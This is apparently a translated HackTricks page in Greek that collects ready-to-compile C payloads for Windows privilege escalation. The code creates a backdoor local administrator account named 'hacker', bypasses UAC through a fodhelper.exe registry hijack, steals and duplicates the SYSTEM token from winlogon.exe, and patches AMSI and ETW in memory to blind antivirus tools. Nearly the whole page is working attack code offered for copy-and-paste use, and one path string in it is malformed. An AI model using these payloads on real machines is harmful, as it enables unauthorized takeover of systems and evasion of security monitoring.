# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συγκεντρώνει **μικρές, αυτοτελείς αποσπασματικές C** που είναι χρήσιμες κατά τη διάρκεια της Τοπικής Κλιμάκωσης Δικαιωμάτων στα Windows ή μετά από εκμετάλλευση. Κάθε payload έχει σχεδιαστεί για να είναι **φιλικό προς την αντιγραφή και επικόλληση**, απαιτεί μόνο το Windows API / C runtime και μπορεί να μεταγλωττιστεί με `i686-w64-mingw32-gcc` (x86) ή `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Αυτά τα payloads υποθέτουν ότι η διαδικασία έχει ήδη τα ελάχιστα δικαιώματα που απαιτούνται για να εκτελέσει την ενέργεια (π.χ. `SeDebugPrivilege`, `SeImpersonatePrivilege`, ή μέσος-ακεραιότητας πλαίσιο για μια παράκαμψη UAC). Είναι προορισμένα για **ρυθμίσεις red-team ή CTF** όπου η εκμετάλλευση μιας ευπάθειας έχει οδηγήσει σε αυθαίρετη εκτέλεση εγγενών κωδίκων.

---

## Προσθήκη τοπικού χρήστη διαχειριστή
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Όταν εκτελείται το αξιόπιστο δυαδικό αρχείο **`fodhelper.exe`**, ερωτά την παρακάτω διαδρομή μητρώου **χωρίς να φιλτράρει το ρήμα `DelegateExecute`**. Με την τοποθέτηση της εντολής μας κάτω από αυτό το κλειδί, ένας επιτιθέμενος μπορεί να παρακάμψει το UAC *χωρίς* να ρίξει ένα αρχείο στον δίσκο.

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Ένα ελάχιστο PoC που ανοίγει ένα ανυψωμένο `cmd.exe`:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Δοκιμάστηκε σε Windows 10 22H2 και Windows 11 23H2 (patches Ιουλίου 2025). Η παράκαμψη εξακολουθεί να λειτουργεί επειδή η Microsoft δεν έχει διορθώσει τον ελλιπή έλεγχο ακεραιότητας στο μονοπάτι `DelegateExecute`.*

---

## Δημιουργία shell SYSTEM μέσω διπλασιασμού token (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Εάν η τρέχουσα διαδικασία κατέχει **και τα δύο** δικαιώματα `SeDebug` και `SeImpersonate` (τυπικό για πολλούς λογαριασμούς υπηρεσιών), μπορείτε να κλέψετε το token από το `winlogon.exe`, να το διπλασιάσετε και να ξεκινήσετε μια ανυψωμένη διαδικασία:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Για μια πιο βαθιά εξήγηση του πώς λειτουργεί αυτό, δείτε:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patch AMSI & ETW στη Μνήμη (Αποφυγή Άμυνας)
Οι περισσότερες σύγχρονες μηχανές AV/EDR βασίζονται στο **AMSI** και το **ETW** για να ελέγχουν κακόβουλες συμπεριφορές. Η διόρθωση και των δύο διεπαφών νωρίς μέσα στη τρέχουσα διαδικασία αποτρέπει την σάρωση payloads που βασίζονται σε σενάρια (π.χ. PowerShell, JScript).
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Η παραπάνω επιδιόρθωση είναι τοπική για τη διαδικασία; Η εκκίνηση ενός νέου PowerShell μετά την εκτέλεσή της θα εκτελείται χωρίς επιθεώρηση AMSI/ETW.*

---

## Αναφορές
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
